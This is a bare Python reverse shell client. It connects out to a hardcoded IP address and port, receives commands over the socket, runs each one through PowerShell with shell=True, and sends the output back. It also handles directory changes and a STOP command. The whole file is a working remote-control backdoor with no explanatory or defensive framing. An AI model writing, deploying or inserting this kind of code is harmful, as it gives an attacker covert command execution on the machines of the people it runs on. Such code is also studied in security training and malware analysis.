import socket
import os
import subprocess
identifier = "<END OF FILE>"
arp_addresss = ("192.168.18.149",9000)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(arp_addresss)
while True:
    command = s.recv(1024)
    command = command.decode()
    print(command)
    if command == "STOP":
        s.close()
        break
    elif command == "":
        continue
    elif command.startswith("cd"):
        print("1")
        pathtomove = command.strip("cd ")
        print(pathtomove)
        if os.path.exists(pathtomove):
            print("2")
            os.chdir(pathtomove)
            print("3")
            message = os.getcwd()
            print(message)
        else:
            print("not exist")
            message = "path doesnot exit"

    else:
       raw_message =  subprocess.run(["powershell.exe",command],shell = True,capture_output=True)
       if raw_message.stderr == "".encode():
          message = raw_message.stdout.decode()
       else:
           message = "error"


    message = message + identifier
    s.sendall(message.encode())
